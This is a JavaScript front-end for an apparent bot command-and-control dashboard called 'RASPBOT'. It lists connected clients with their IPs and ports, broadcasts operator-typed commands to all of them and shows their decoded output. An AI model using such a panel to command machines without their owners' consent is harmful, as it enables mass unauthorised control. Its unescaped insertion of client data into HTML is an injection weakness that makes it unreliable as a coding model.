$(document).ready(() => {
    let socket = io('http://127.0.0.1:8040');
    let $numberOfConnections = $('#number_of_connections');

    let termMain = $('#terminal').terminal(function (cmd, term) {
            $.ajax({
            url: '/control/broadcast-cmd/',
            data: {
                cmd: cmd
            },
            method: 'post'
        })
    }, {
        greetings: 'RASPBOT COMMAND AND CONQUER THE WORLD!\nUse the force...',
        name: 'raspbot',
        height: 400,
        prompt: '> '
    });


    socket.on('new-connection', function (data) {
        addConnection(JSON.parse(data));
    });
    socket.on('delete-connection', function (data) {
        deleteConnection(JSON.parse(data))
    });
    socket.on('update-connection', function (data) {
        updateConnection(JSON.parse(data));
    });
    socket.on('info', function (data) {
        termMain.echo(JSON.parse(data));
    });
    socket.on('data', function (data) {
        let packet =JSON.parse(data);
        let output = `-> ${packet.receiver_id} : ${packet.data.name}  \n ${atob(packet.data.output)}`
        termMain.echo(output);
    });

    let addConnection = function (data) {
        $('#connections tr:last').after(getConnectionHtml(data));
        changeNumberOfConnections(1);
    };
    let deleteConnection = function (data) {
        $('tr[data-connection-id=' + data.id + ']').empty();
        changeNumberOfConnections(-1);
    };
    let updateConnection = function (data) {
        let element = $('tr[data-connection-id=' + data.id + ']').replaceWith(getConnectionHtml(data));
    };
    let changeNumberOfConnections = function (delta) {
        let currentNumber = parseInt($numberOfConnections.text(), 10);
        $numberOfConnections.text(currentNumber + delta);
    };
    let getConnectionHtml = function (data) {
        return `
             <tr data-connection-id="${data.id}">
                <td>${data.id}</td>
                <td>${data.name}</td>
                <td>${data.ip}</td>
                <td>${data.port}</td>
                <td><a href="/control/${data.id}" class="btn btn-success btn-xs">CONTROL</a></td>
            </tr>`
    };

    $('#mass-command').on('submit', function (e) {
        e.preventDefault();
        let formdata = $(this).serialize();

        $.ajax({
            url: "/control/broadcast-cmd/",
            data: formdata,
            method: 'post'
        })
    });
});